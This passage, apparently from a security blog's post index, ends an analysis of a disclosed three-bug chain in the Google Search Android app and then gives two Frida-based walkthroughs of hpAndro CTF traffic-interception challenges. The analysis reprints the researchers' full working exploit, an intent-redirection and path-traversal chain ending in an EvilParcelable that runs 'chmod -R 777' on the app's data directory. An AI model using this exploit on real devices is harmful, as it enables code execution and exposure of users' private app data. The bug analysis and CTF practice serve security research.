context.getSystemService(\u0026#34;keyguard\u0026#34;); if (Build.VERSION.SDK_INT \u0026lt; 26 || !keyguardManager.isKeyguardLocked() || keyguardManager.isDeviceLocked() || !(context instanceof Activity)) { com.google.android.apps.gsa.shared.r.a.a aVar = d.f72126a; context.startActivity(intent, l2); \u0026lt;--- here the application launches the intent received as parameter } else { So this is the chain that allows the exploit of the intent redirection from the SearchNowActivity.\nContent Provider With the previous bug we had access to all the non exported components from a third-party application. So always the next step in order to see the severity of the previous bug is finding a good impact. In this case they found one of the providers with the flag android:grantUriPermissions=\u0026ldquo;true\u0026rdquo;:\n\u0026lt;provider android:name=\u0026#34;com.google.android.apps.gsa.contentprovider.CommonContentProvider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:process=\u0026#34;:search\u0026#34; android:authorities=\u0026#34;com.google.android.googlequicksearchbox.CommonContentProvider\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;/\u0026gt; It contained several handlers, one of which was in the class com.google.android.apps.gsa.staticplugins.g.c.b:\npublic final ParcelFileDescriptor g(Uri uri, String str) { f(uri); File i2 = i(uri); // `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/` directory if (i2 == null) { N.b(f96308d.b(), \u0026#34;Path not found for uri %s\u0026#34;, uri, 14080); String valueOf = String.valueOf(uri.toString()); throw new FileNotFoundException(valueOf.length() != 0 ? \u0026#34;Path not found for uri \u0026#34;.concat(valueOf) : new String(\u0026#34;Path not found for uri \u0026#34;)); } i2.mkdirs(); //uri.getLastPathSegment() unescapes the content received return ParcelFileDescriptor.open(new File(i2, uri.getLastPathSegment()), ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault()))); //path traversal leading to any file in the application folder } In the original post there is no explanation of how the handlers are configured. There was no easy way to find the class shown in the report, because the code is passed through a deobfuscator (similar in results and syntaxis to the one of jadx), so the classes are not the ones decoded by jadx. I could find the class by checking what the i(uri) did:\nprivate final File i(Uri uri) { if (uri.equals(Uri.EMPTY)) { return null; } File filesDir = this.f96312h.getFilesDir(); List\u0026lt;String\u0026gt; pathSegments = uri.getPathSegments(); String str = pathSegments.get(pathSegments.size() - 2); //validates that the path is /data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/ or /data/data/com.google.android.googlequicksearchbox/files/ScreenAssistCropScreenshots/ if (str.equals(\u0026#34;ScreenAssistScreenshots\u0026#34;) || str.equals(\u0026#34;ScreenAssistCropScreenshots\u0026#34;)) { return new File(filesDir, uri.getEncodedPath()).getParentFile(); } ... com.google.android.apps.gsa.staticplugins.g.c.b is not used directly, it extends an abstract class \u0026ldquo;d\u0026rdquo;:\npublic final ParcelFileDescriptor g(Uri uri, String str) It is being called in \u0026ldquo;com.google.android.apps.gsa.contentprovider.a.g\u0026rdquo;:\npublic final Object a() { j jVar = this.f29642a; f fVar = this.f29643b; a aVar = jVar.f29652b; Uri uri = fVar.f29655a; String str = fVar.f29660b; Pair\u0026lt;d, Uri\u0026gt; b2 = aVar.b(uri); if (com.google.android.libraries.aw.g.f186855a.booleanValue()) { String valueOf = String.valueOf(uri); String valueOf2 = String.valueOf(b2.first); String valueOf3 = String.valueOf(b2.second); int length = String.valueOf(valueOf).length(); StringBuilder sb = new StringBuilder(length + 30 + String.valueOf(valueOf2).length() + String.valueOf(valueOf3).length()); sb.append(\u0026#34;openFile(\u0026#34;); sb.append(valueOf); sb.append(\u0026#34;) delegated to \u0026#34;); sb.append(valueOf2); sb.append(\u0026#34; uri: \u0026#34;); sb.append(valueOf3); Log.d(\u0026#34;DynamicHostProvider\u0026#34;, sb.toString()); } return ((d) b2.first).g((Uri) b2.second, str); } In this case we see that based on the Uri received, the \u0026ldquo;aVar.b\u0026rdquo; method returns a Pair\u0026lt;d, Uri\u0026gt;. In this case d is a Handler, which returns the ParcelFileDescriptor we wanted. This method generates a Uri based on the uri received. The method creates the instance of d\npublic final Pair\u0026lt;d, Uri\u0026gt; b(Uri uri) { Pair pair = null; if (uri != null) { ArrayList arrayList = new ArrayList(uri.getPathSegments()); if (arrayList.size() \u0026gt;= 2) { //parse Uri pair = Pair.create(str, build); } else if (f186855a.booleanValue()) { String valueOf3 = String.valueOf(uri); StringBuilder sb2 = new StringBuilder(String.valueOf(valueOf3).length() + 13); sb2.append(\u0026#34;Invalid URI: \u0026#34;); sb2.append(valueOf3); Log.w(\u0026#34;DynamicHostProvider\u0026#34;, sb2.toString()); } } if (pair != null) { // in a the d object is generated. return Pair.create(a((String) pair.first), (Uri) pair.second); } String valueOf4 = String.valueOf(uri.toString()); throw new IllegalArgumentException(valueOf4.length() != 0 ? \u0026#34;Invalid uri: \u0026#34;.concat(valueOf4) : new String(\u0026#34;Invalid uri: \u0026#34;)); } a is an abstract method from com.google.android.libraries.aw.g:\npublic abstract d a(String str); We need to find which class returns the \u0026ldquo;com.google.android.apps.gsa.staticplugins.g.c.b\u0026rdquo; class, but it gets complicated to trace statically this code. The alternative in this case is to run the application and trace it.\nNOTE: The remaining analysis on this section path will be done in a future due to limitations on environment.\nGoogle play command execution After the content provider is sent to the client, the attacker writes a file in a particular folder. This triggers the a ClassLoader (that vulnerability can be seen in more detail on the following blogpost https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/).\nAfter the three steps are executed an attacker needs to send any Intent message to a component that deserializes the payload. Android deserializes all the objects sent in an Intent as a parameter when any extra of the it is required, like in the following example:\nIntent intent = getIntent(); String expected = intent.getStringExtra(\u0026#34;EXPECTED\u0026#34;); You can read more about this bug in the following post: https://securitylab.github.com/research/android-deserialization-vulnerabilities/\nIn this case the attacker would send as a parameter a deserializable class that would execute code on the method that parses it. In this case the attacker knows which class is vulnerable because they forced the application to load it by abusing the Google play command bug.\nThe following payload is shown in the original post:\npublic class MainActivity extends Activity { static final String APP = \u0026#34;com.google.android.googlequicksearchbox\u0026#34;; protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); handle(getIntent()); } protected void onNewIntent(Intent intent) { super.onNewIntent(intent); handle(intent); } private void handle(Intent intent) { if(\u0026#34;evil\u0026#34;.equals(intent.getAction())) { try { //3- upload the APK with the malicious class in the victim application //the inclusion of the file in the ClassLoader is due to the third vulnerability in the chain InputStream i = new FileInputStream(getApplicationInfo().sourceDir); OutputStream o = getContentResolver().openOutputStream(intent.getData()); IOUtils.copy(i, o); i.close(); o.close(); } catch (Throwable th) { throw new RuntimeException(th); } start(); } else { //2- abusing content provider and path traversal (see the escaped path ..%2Fsplitcompat%2F) //this will be called by the victim application automatically due to the intent redirection bug that we already analyzed Uri uri = Uri.parse(\u0026#34;content://com.google.android.googlequicksearchbox.CommonContentProvider/assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/ScreenAssistScreenshots/..%2Fsplitcompat%2F\u0026#34; + getVersionCode() + \u0026#34;%2Fverified-splits%2Fconfig.test.apk\u0026#34;); Intent next = new Intent(\u0026#34;evil\u0026#34;, uri); next.setClass(this, getClass()); next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); //1- abusing the intent redirection in SearchActivity Intent i = new Intent(\u0026#34;android.intent.action.ASSIST\u0026#34;); i.setClassName(APP, \u0026#34;com.google.android.googlequicksearchbox.SearchActivity\u0026#34;); i.putExtra(\u0026#34;KEY_HANDOVER_THROUGH_VELVET\u0026#34;, next); startActivity(i); } } private int getVersionCode() { try { return getPackageManager().getPackageInfo(APP, 0).versionCode; } catch (Throwable th) { throw new RuntimeException(th); } } private void start() { //4- after the class is loaded, any component that gets an extra from the intent will deserialize the EvilParcelable class. This is pretty easy to find in any application Intent i = new Intent(\u0026#34;com.google.android.gms.udc.action.FACS_CACHE_UPDATED_EXPLICIT\u0026#34;); i.setClassName(APP, \u0026#34;com.google.android.apps.search.googleapp.permissions.udcdataservice.facs.FacsBroadcastReceiver_Receiver\u0026#34;); i.putExtra(\u0026#34;evil\u0026#34;, new EvilParcelable()); sendBroadcast(i); } } And the EvilParcelable class:\npublic class EvilParcelable implements Parcelable { public static final Parcelable.Creator\u0026lt;EvilParcelable\u0026gt; CREATOR = new Parcelable.Creator\u0026lt;EvilParcelable\u0026gt;() { public EvilParcelable createFromParcel(android.os.Parcel parcel) { exploit(); return null; } public EvilParcelable[] newArray(int i) { exploit(); return null; } private void exploit() { try { Runtime.getRuntime().exec(\u0026#34;chmod -R 777 /data/data/\u0026#34; + MainActivity.APP).waitFor(); } catch (Throwable th) { throw new RuntimeException(th); } } }; public int describeContents() { return 0; } public void writeToParcel(android.os.Parcel parcel, int i) {} } This is an incredible bug, using a chain of three different vulnerabilities to find a persistent remote code execution. It is worth understanding the whole chain because it uses different techniques that are commonly find in many applications. Congratulations to the Oversecured team that found it!\n","permalink":"https://cmrodriguez.me/blog/bug-analysis-google-search-rce/","tags":["Android","Bug"],"title":"Analyzing bug - Dynamic Code Loading on Google App"},{"categories":["Frida","Android","CTF","Challenge","HTTPS","TCP","UDP"],"contents":"In this series of posts I\u0026rsquo;ll be solving the hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nThis application has a lot of simple challenges, so it is good for beginners or to test some techniques. I\u0026rsquo;ll try to solve all the challenges using Frida. As a secondary objective I\u0026rsquo;ll try to use scripts that can work in multiple scenarios and not just to get the flag.\nIn this post we continue solving issues of hpAndro with Frida. We have three different challenges to solve:\nIntercept HTTPS traffic. Intercept TCP traffic. Intercept UDP traffic. Intercept HTTPS traffic Whenever we have an application with https traffic (luckily nowadays most of them have https instead of http), we have to do some extra steps in order to intercept the traffic, as in most scenarios the application won\u0026rsquo;t recognize the Web Proxy root certificate as a trusted one.\nThe first option is installing the certificate in the cellphone as a user certificate. This will work only in an Android OSs with API level 23 or lower. So if the application is compatible with older versions of Android and you have an old cellphone or VM, you could try to test it in that environment.\nWith API 24 and above, Android added the Network Security Configuration feature which lets the developer customize the network security settings of the application in a safe, declarative configuration file without modifying app code. (see https://developer.android.com/training/articles/security-config). By default applications do not trust user certificates. Generally speaking in a release version of an app it is weird to see the user certificates configuration. So there are 3 alternatives.\na- Install the web proxy certificate as a system cert. This can only be done for rooted devices as the user needs to have those rights to set the system partition as read/write. I will not cover those steps here, because this is already documented in many places.\nOne of the advantages of this approach is that you do it once, and unless you change the device or the proxy, it will work for all the applications you install on it. Other advantage is that you do not need to change the application.\nb- Modify the application in order to set the network security configuration to accept user certificates. This alternative requires to decompile and recompile the application, so it might be cumbersome in modern application because some tools that unpacks and repacks the applications throw errors in them. I tend to avoid this approach unless it is strictly neccesary.\nc- Using Frida. I\u0026rsquo;ve already covered different strategies and scripts in previous posts: Network security bypass 2 and Network security bypass.\nOne of the first things I do when I start the analysis of an application is checking the AndroidManifest to get an idea of the permissions the application requests, the exposed components and the network security configuration. In this case I\u0026rsquo;ll check just the third as it is needed to solve the challenge:\nAndroidManifest.xml:\n\u0026lt;application android:theme=\u0026#34;@style/AppTheme\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:name=\u0026#34;com.hpandro.androidsecurity.MainApp\u0026#34; ... *android:networkSecurityConfig=\u0026#34;@xml/network_security_config\u0026#34;* ...\u0026gt; As the application tag has the attribute android:networkSecurityConfig, I need to check the file that is defined as the value of that attribute. In this case it is res/xml/network_security_config.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;network-security-config\u0026gt; \u0026lt;domain-config cleartextTrafficPermitted=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;hpandro.raviramesh.info \u0026lt;/domain\u0026gt; \u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;raviramesh.info \u0026lt;/domain\u0026gt; \u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;hpandro.me \u0026lt;/domain\u0026gt; \u0026lt;trust-anchors\u0026gt; \u0026lt;certificates src=\u0026#34;system\u0026#34;/\u0026gt; \u0026lt;certificates src=\u0026#34;user\u0026#34;/\u0026gt; \u0026lt;/trust-anchors\u0026gt; \u0026lt;/domain-config\u0026gt; \u0026lt;/network-security-config\u0026gt; So in this case for the following domains, the application accepts user certificates:\nhpandro.raviramesh.info raviramesh.info hpandro.me I still need to check what does the application in the challenge. If the request is to one of the previous domains, the proxy configuration will work without doing anything else.\nThe activity called in the task can be seen in the AndroidManifest.xml as well:\n\u0026lt;activity android:name=\u0026#34;com.hpandro.androidsecurity.ui.activity.task.trafficanalysis.HTTPsTrafficActivity\u0026#34;/\u0026gt; Whenever I navigate to the class defined in the manifest and read the code in the onCreate function I see the following URL:\nif (z) { WebView webView4 = (WebView) y(R.id.webviewTask); g.c(webView4); webView4.loadUrl(\u0026#34;https://hpandro.raviramesh.info/https_task.php\u0026#34;); } So in this case the challenge could be solved easily, but as our objective is to solve the challenge with Frida, we\u0026rsquo;ll have to create an script and retrieve the flag with it.\nBy reading the content of the challenge I realized that the code is exactly the same as in the HTTPTrafficActivity, so the only change needed is to change the URL on the script. The final script is the following one:\nfunction readNewStream(inputStream) { var BufferedReader = Java.use(\u0026#39;java.io.BufferedReader\u0026#39;); var InputStreamReader = Java.use(\u0026#39;java.io.InputStreamReader\u0026#39;); var inputStreamReader = InputStreamReader.$new(inputStream); var r = BufferedReader.$new(inputStreamReader); var StringBuilder = Java.use(\u0026#39;java.lang.StringBuilder\u0026#39;); var total = StringBuilder.$new(); var String = Java.use(\u0026#39;java.lang.String\u0026#39;); while (true) { var line = r.readLine(); if (line == null) { break; } else { total.append(line).append(String.$new(\u0026#39;\\n\u0026#39;)); } } console.log(total.toString()); } Java.perform( function () { var WebViewClient = Java.use(\u0026#39;v0.d.a.c.a.d.h.b\u0026#39;); WebViewClient.shouldInterceptRequest.overload(\u0026#39;android.webkit.WebView\u0026#39;, \u0026#39;android.webkit.WebResourceRequest\u0026#39;).implementation = function (webView, request) { var WebResourceResponse = Java.use(\u0026#39;android.webkit.WebResourceResponse\u0026#39;); var isFavicon = request.getUrl().toString().search(\u0026#34;favicon.ico\u0026#34;) \u0026gt; 0; var URL = Java.use(\u0026#39;java.net.URL\u0026#39;); var url = URL.$new(request.getUrl().toString()); var HttpURLConnection = Java.use(\u0026#39;java.net.HttpURLConnection\u0026#39;); var urlConnection = Java.cast(url.openConnection(),HttpURLConnection); var String = Java.use(\u0026#39;java.lang.String\u0026#39;); urlConnection.setRequestProperty(String.$new(\u0026#34;User-Agent\u0026#34;), String.$new(\u0026#34;hpAndro\u0026#34;)); var BufferedInputStream = Java.use(\u0026#39;java.io.BufferedInputStream\u0026#39;); var inputStr = BufferedInputStream.$new(urlConnection.getInputStream()); var webResourceRes = null; if (!isFavicon) { readNewStream(inputStr); var map = urlConnection.getHeaderFields(); var iter = map.entrySet().iterator(); var Entry = Java.use(\u0026#39;java.util.Map$Entry\u0026#39;); while(iter.hasNext()) { var entry = Java.cast(iter.next(),Entry); console.log(\u0026#34;Key : \u0026#34; + entry.getKey() + \u0026#34; ,Value : \u0026#34; + entry.getValue()); } webResourceRes = WebResourceResponse.$new(\u0026#34;text/html\u0026#34;,\u0026#34;utf-8\u0026#34;, inputStr); } else { webResourceRes = WebResourceResponse.$new(\u0026#34;image/vnd.microsoft.icon\u0026#34;,\u0026#34;gzip\u0026#34;, inputStr); } return webResourceRes; } }); Intercept TCP traffic. As we have non HTTP Traffic, web proxies do not work here. In this case a lower level of sniffer is needed (like wireshark or tcpdump). As the objective is to solve this challenge with Frida, we need to find out how the TCP packets are being sent. We start by searching in the AndroidManifest the activity that generates the communication:\n\u0026lt;activity android:name=\u0026#34;com.hpandro.androidsecurity.ui.activity.task.nonhttptraffic.TCPTrafficActivity\u0026#34;/\u0026gt; We then check the TCPTrafficActivity, and analyze the code of the onCreate method. Note that by using the application we see that the packet seems to be sent whenever the user clicks the button CONNECT:\nSo we want to check what the onClickListener does in that case. We can find it in the following code in the onCreate method:\nonCreate() ((Button) y(R.id.btnConnectTCP)).setOnClickListener(new d(this)); We then check d, a class that implement OnClickListener:\npublic static final class d implements View.OnClickListener { public final /* synthetic */ TCPTrafficActivity e; public d(TCPTrafficActivity tCPTrafficActivity) { this.e = tCPTrafficActivity; } public final void onClick(View view) { ... } } Whenever the user clicks the button, the onClick method from the OnCLickListener is being called, so we have to analyze that method.\npublic final void onClick(View view) { this.e.t = new Thread(new b()); Thread thread = this.e.t; g.c(thread); thread.start(); } which basically instantiates b (an implementation of Runnable) and executes it. We\u0026rsquo;ll do a review of the method run:\npublic void run() { try { ... // socket created with the folling domain and port // public final String w = \u0026#34;hpandro.raviramesh.info\u0026#34;; // public final int x = 65000; tCPTrafficActivity.s = new Socket(tCPTrafficActivity2.w, tCPTrafficActivity2.x); //sets a buffer reader with the InputSttram from a socket in attribute b of the TCPTrafficActivity instance tCPTrafficActivity4.v = new BufferedReader(new InputStreamReader(socket2.getInputStream())); //run a new thread with a Runnable class (a) new Thread(new a()).start(); } catch (IOException e2) { try { e2.printStackTrace(); } catch (IOException e3) { e3.printStackTrace(); } } } We check the implementation of the class a that is in the same file as TCPTrafficActivity:\npublic void run() { BufferedReader bufferedReader; while (true) { try { //v is the bufferreader that takes the InputStream from the socket bufferedReader = TCPTrafficActivity.this.v; g.c(bufferedReader); break; } catch (IOException e2) { e2.printStackTrace(); } } //in this line the bufferReader retrieves the content of the socket, and does nothing with it if (bufferedReader.readLine() != null) { So in this case in order to solve the issue we could override the method readLine from BufferReader in order to show the content of the flag. The following script was created to solve it:\nJava.perform( function () { var BufferedReader = Java.use(\u0026#34;java.io.BufferedReader\u0026#34;); BufferedReader.readLine.overload().implementation = function () { var line = this.readLine(); console.log(line); return line; } }); Intercept UDP traffic. The process to solve this challenge is like the last one, so I\u0026rsquo;ll focus on the analysis of the source code. The following image is taken from the UDP taks:\nWe check the onCreate method to find the implementation of the OnCLickListener:\n((Button) y(R.id.btnConnectUDP)).setOnClickListener(new a(1, this)); In the \u0026ldquo;a\u0026rdquo; class we have the following code:\npublic final void onClick(View view) { int i = this.e; if (i == 0) { ((UDPTrafficActivity) this.f).finish(); } else if (i == 1) { ... //this is the handler that receives the answer in UDPTrafficActivity ((UDPTrafficActivity) this.f).s = new b((UDPTrafficActivity) this.f); b bVar = ((UDPTrafficActivity) this.f).s; g.c(bVar); //this class starts the communication and retrieves the messages //The application is connected to hpandro.raviramesh.info:65001 ((UDPTrafficActivity) this.f).t = new v0.d.a.c.a.d.g.b(\u0026#34;hpandro.raviramesh.info\u0026#34;, 65001, bVar); v0.d.a.c.a.d.g.b bVar2 = ((UDPTrafficActivity) this.f).t; g.c(bVar2); bVar2.start(); } else { throw null; } } We have to navigate to v0.d.a.c.a.d.g.b and see the implementation of the run method:\n... DatagramSocket datagramSocket3 = this.f; g.c(datagramSocket3); datagramSocket3.receive(datagramPacket2); //data retrieved from the socket byte[] data = datagramPacket2.getData(); g.d(data, \u0026#34;packet.data\u0026#34;); //converts byteArray to String String str = new String(data, 0, datagramPacket2.getLength(), a.a); UDPTrafficActivity.b bVar3 = this.e; //bVar3.sendMessage is invoked and the String is sent as parameter bVar3.sendMessage(Message.obtain(bVar3, 1, str));UDPTrafficActivity.b datagramSocket = this.f; if (datagramSocket == null) { return; } The application is using the (Message)[https://developer.android.com/reference/android/os/Message] framework that provides Android to send messages from the previous class to the AndroidActivity. So we have to check the handleMessage, and what it does with the String. The Message has the following content:\nmessage.what: int that identifies the kind of message sent . In this case it has the valui 1. message.obj: Object with the message. In this case it is the String retrieved from the socket. The handleMessage handles the message type 1 in the following way:\nUDPTrafficActivity uDPTrafficActivity2 = this.a; Object obj2 = message.obj; if (obj2 != null) { int i3 = UDPTrafficActivity.v; uDPTrafficActivity2.getClass(); System.out.println((Object) (\u0026#34;+++++++++++++++ updateRxMsg:\u0026#34; + ((String) obj2))); uDPTrafficActivity2.runOnUiThread(new v0.d.a.c.a.d.g.a(uDPTrafficActivity2)); return; As it can be seen the application executes a System.out.println with the String received. If we check the logcat logs from the application we will see that the flag is printed there. So there is no need to create a Frida script to solve the challenge. Nevertheless, we\u0026rsquo;ll do it.\nIn this case the easiest thing is to execute a hook on the method getData of DatagramPacket:\nJava.perform( function () { var DatagramPacket = Java.use(\u0026#34;java.net.DatagramPacket\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var a = Java.use(\u0026#34;a1.u.a\u0026#34;); DatagramPacket.getData.implementation = function () { var data = this.getData(); console.log(String.$new(data, 0, this.getLength(),a.a.value)); return data; } }); In the following link https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%202 you can find the following content:\nhttps_task.js: Scrip used to solve the task of https interception. tcp_traffic.js: Script to solve the TCP interception task. udp_traffic.js: Script to solve the UDP interception task. ","permalink":"https://cmrodriguez.me/blog/hpandro-2/","tags":["Frida","Android","CTF","Challenge","HTTPS","TCP","UDP"],"title":"Solving CTF with Frida - Part 2"},{"categories":["Frida","Android","CTF","Challenge","HTTP"],"contents":"In this series of posts I\u0026rsquo;ll be solving the hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nThis application has a lot of simple challenges, so it is good for beginners or to test some techniques. I\u0026rsquo;ll try to solve all the challenges using Frida. As a secondary objective I\u0026rsquo;ll try to use scripts that can work in multiple scenarios and not just to get the flag.\nThe first challenge to solve is the Http interception. This challenge can be solved with the following strategies:\nIntercepting the application requests with any web-proxy. Use a lower stack network proxy like wireshark. In this case it is possible because the content is in cleartext. Using static code analysis tools in order to find what the application does, and executing the same request on a browser. Last but not least, using Frida. As we already explained, we\u0026rsquo;ll be solving the challenge with Frida. So in order to find what to script with Frida, I\u0026rsquo;ll check the decompiled application.\nSo the first thing to find is which component is executing the request that has to be intercepted. This can be done analyzing the Android Manifest, where we can find the following activity:\n\u0026lt;activity android:name=\u0026#34;com.hpandro.androidsecurity.ui.activity.task.trafficanalysis.HTTPTrafficActivity\u0026#34;/\u0026gt; In this case the activity class is descriptive, so we can read that class directly. We can find in the HTTPTrafficActivity class the following code:\nif (z) { WebView webView4 = (WebView) y(R.id.webviewTask); g.c(webView4); webView4.loadUrl(\u0026#34;http://hpandro.raviramesh.info/http_task.php\u0026#34;); } It can be seen that the URL is being loaded in a WebView. As it is a GET request, I executed it in a browser. But the server did not return any content on the response.\nAfter reading a bit more what was being done in the code I found the following method:\na.D(a.J((WebView) y(R.id.webviewTask), \u0026#34;webviewTask!!.settings\u0026#34;, true, true, false, false, true), WebSettings.LayoutAlgorithm.SINGLE_COLUMN, 2, true, \u0026#34;hpAndro\u0026#34;); a.J does not do anything significative for our analysys, but a.D does the following:\npublic static void D(WebSettings webSettings, WebSettings.LayoutAlgorithm layoutAlgorithm, int i, boolean z, String str) { webSettings.setLayoutAlgorithm(layoutAlgorithm); webSettings.setCacheMode(i); webSettings.setDomStorageEnabled(z); webSettings.setUserAgentString(str); } which sets up \u0026ldquo;hpAndro\u0026rdquo; as the User-Agent. I tested the request changing it:\nGET /http_task.php HTTP/1.1 Host: hpandro.raviramesh.info Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: hpAndro Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 X-Requested-With: com.hpandro.androidsecurity Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close which returns the desired flag in a header. So in order to solve this challenge we need to see the way to intercept traffic in a WebView.\nWhenever I have to create a complex script with Frida I follow 3 steps.\nCode a Java application that does whatever I want the Frida script to. I do this in order to discard the complexity of the targeted application and focus on the problem to solve. In this case it was how to intercept the request and the response from a WebView.\nTranslate the Java code in a Frida script. In this case the translation is in the mock application.\nAdapt the code to the particular application. As the Frida script from step 2 applies to the mock application, I need to find where to hook the script in the targeted application in order to make it work.\nStep 1 It is not that easy to intercept requests from a WebView, as it runs in a different process and executes requests in a browser engine. So I had to find a way to change the behavior of the WebView in order to send the traffic through the Java layer. I found that the Android SDK has a way to configure the way the resources are being loaded by the WebViewClient through the function shouldInterceptRequest. This function is used to notify the host application of a resource request and allow the application to return the data. If the return value is null, the WebView will continue to load the resource as usual. Otherwise, the return response and data will be used.\nSo if we implement this function in the Java layer, the application will be able to intercept the requests sent by the WebView.\nNote: This function works fine for GET parameters, with other verbs with body it does not work.\nSo I created an Activity in an application with a WebView, and implemented the shouldInterceptRequest:\na. Configure the WebViewClient for the WebView:\ntestWebView.setWebViewClient(new WebViewClient() { @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP) @Override public WebResourceResponse shouldInterceptRequest (final WebView view, WebResourceRequest request) { ... WebResourceResponse webResourceResponse = FirstFragment.shouldInterceptRequest(view, request); return webResourceResponse; ... b. Implement the function that takes the content of the original request (WebResourceRequest) and executes the request. It is possible, because the WebResourceRequest instance has the URL and headers of the original petition.\n@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP) private static WebResourceResponse shouldInterceptRequest (final WebView view, WebResourceRequest request) { //show method System.out.println(\u0026#34;Method: \u0026#34; + request.getMethod()); //show URL and queryString System.out.println(\u0026#34;Uri: \u0026#34; + request.getUrl().toString()); //show all http headers Map\u0026lt;String, String\u0026gt; headers = request.getRequestHeaders(); for (Map.Entry\u0026lt;String,String\u0026gt; entry : headers.entrySet()) System.out.println(\u0026#34;Header: \u0026#34; + entry.getKey() + \u0026#34;= \u0026#34; + entry.getValue()); // and here, if you want, you can load the page normally String htmlContent = \u0026#34;\u0026#34;; URL url = null; try { //execute the request url = new URL(request.getUrl().toString()); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestProperty(\u0026#34;User-Agent\u0026#34;, \u0026#34;hpAndro\u0026#34;); try { InputStream in = new BufferedInputStream(urlConnection.getInputStream()); //print content of response readStream(in); Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; map = urlConnection.getHeaderFields(); for (Map.Entry\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;Key : \u0026#34; + entry.getKey() + \u0026#34; ,Value : \u0026#34; + entry.getValue()); } //return response to the WebView. WebResourceResponse webResourceRes; webResourceRes = new WebResourceResponse(\u0026#34;text/html\u0026#34;,\u0026#34;utf-8\u0026#34;, in); return webResourceRes; ... As it can be seen in the previous code, we achieve the initial goal of sending the request to the Java layer in order to manipulate it then with Frida.\nStep 2 We need to translate the previous code to a Frida script. Most of the translation is straightforward if you have done some scripts on your own.\nThe most complex part of the translation is that the solution needs us to create a new class that inherits from WebViewClient, and that implements the shouldInterceptRequest.\nThe following Java code creates an anonymous class, that is being used as a parameter in the setWebViewClient:\ntestWebView.setWebViewClient(new WebViewClient() { In Frida we can\u0026rsquo;t create anonymous classes, so we have to use the Java.registerClass API:\nvar WebViewClient = Java.use(\u0026#39;android.webkit.WebViewClient\u0026#39;); var MyWebViewClient = Java.registerClass({ name: \u0026#39;com.example.MyWebViewClient\u0026#39;, superClass: WebViewClient, methods: { $init() { console.log(\u0026#39;Constructor called\u0026#39;); }, shouldInterceptRequest: [{ returnType: \u0026#39;android.webkit.WebResourceResponse\u0026#39;, argumentTypes: [\u0026#39;android.webkit.WebView\u0026#39;, \u0026#39;android.webkit.WebResourceRequest\u0026#39;], implementation(webView, request) { ... return webResourceRes; } }], } }); The other issue I had creating the scripts is that Frida-client breaks whenever a method returns a null value. In this case I wanted to return null in all non HTML requests (like the favico or any javascript/css request), and avoid creating a WebResourceResponse per each potential kind of resource.\nAs I couldn\u0026rsquo;t find a way to make it work I analyzed the resources being requested by the webview and then create different WebResourceResponses based on them. That is the reason you\u0026rsquo;ll find in a script the following if statement:\nif (!isFavicon) { ... webResourceRes = WebResourceResponse.$new(\u0026#34;text/html\u0026#34;,\u0026#34;utf-8\u0026#34;, inputStr); } else { webResourceRes = WebResourceResponse.$new(\u0026#34;image/vnd.microsoft.icon\u0026#34;,\u0026#34;gzip\u0026#34;, inputStr); } In order to create a custom script to intercept all HTTP traffic, you\u0026rsquo;ll need to consider that you\u0026rsquo;ll need to handle the non HTTP traffic as well, because of the return of null error.\nStep 3 I needed to find a place to inject the script in the original application. The requirements of the script I wrote is that I need the reference to the WebView in order to set the WebViewClient. Based on the decompiled code:\nsuper.onCreate(bundle); setContentView(R.layout.activity_httptraffic); ... boolean z = true; this.i.a(this, new v0.d.a.c.a.d.h.j(this, true)); a.D(a.J((WebView) y(R.id.webviewTask), \u0026#34;webviewTask!!.settings\u0026#34;, true, true, false, false, true), WebSettings.LayoutAlgorithm.SINGLE_COLUMN, 2, true, \u0026#34;hpAndro\u0026#34;); int i = Build.VERSION.SDK_INT; WebView webView = (WebView) y(R.id.webviewTask); ... if (systemService != null) { ... if (z) { WebView webView4 = (WebView) y(R.id.webviewTask); g.c(webView4); webView4.loadUrl(\u0026#34;http://hpandro.raviramesh.info/http_task.php\u0026#34;); } else { RelativeLayout relativeLayout = (RelativeLayout) y( ... } ((Button) y(R.id.btnCheck)).setOnClickListener(new i(this)); return; } throw new NullPointerException(\u0026#34;null cannot be cast to non-null type android.net.ConnectivityManager\u0026#34;); the function that receives a WebView as a parameter is a.J. So I created the hook on that function:\nvar WebViewConfigurator = Java.use(\u0026#34;v0.a.a.a.a\u0026#34;); WebViewConfigurator.J.implementation = function (webView, str, z, z2, z3, z4, z5) { webView.setWebViewClient(MyWebViewClient.$new()); return this.J(webView, str, z, z2, z3, z4, z5); } The final script can be seen in the following URL: https://github.com/CesarMRodriguez/lunesdemobile/blob/main/Sesion%201/http_task.js\nSadly after running the script in the application to see if it worked, I 